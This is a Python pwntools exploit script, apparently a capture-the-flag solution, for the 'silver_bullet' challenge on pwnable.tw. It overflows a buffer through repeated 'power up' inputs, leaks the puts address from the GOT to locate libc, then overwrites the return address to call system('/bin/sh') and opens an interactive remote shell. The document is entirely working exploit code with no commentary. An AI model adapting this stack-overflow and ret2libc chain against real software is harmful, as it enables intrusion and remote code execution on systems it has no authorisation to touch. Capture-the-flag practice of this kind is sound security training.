#!/usr/bin/env python

from pwn import *

context.update(log_level='debug', arch='i386', os='linux')

#p = process('./silver_bullet')
p = remote('chall.pwnable.tw', 10103)

def createbullet(desc):
    p.sendlineafter('Your choice :','1')
    p.sendlineafter('bullet :', desc)

def powerup(desc):
    p.sendlineafter('Your choice :', '2')
    p.sendlineafter('bullet :', desc)

def beat():
    p.sendlineafter('Your choice :', '3')


puts_plt = 0x80484a8
puts_got = 0x804afdc
main_func = 0x8048954

createbullet('A' * 47)
powerup('B' * 1)
powerup(p32(0x7FFFFFFF) + 'OVE' + p32(puts_plt) + p32(main_func) + p32(puts_got))
beat();

p.recvuntil('Oh ! You win !!\n')
puts_real = u32(p.recv(4)[:4])


libc_real = puts_real - 0x0005f140
system_real = libc_real + 0x0003a940
binsh_real = libc_real +  0x00158E8B

log.success('puts_real = ' + hex(puts_real))
log.success('libc_real = ' + hex(libc_real))
log.success('system_real = ' + hex(system_real))
log.success('binsh_real = ' + hex(binsh_real))

createbullet('A' * 47)
powerup('B' * 1)
powerup(p32(0x7FFFFFFF) + 'OVE' + p32(system_real) + p32(main_func) + p32(binsh_real))
beat();

p.interactive()
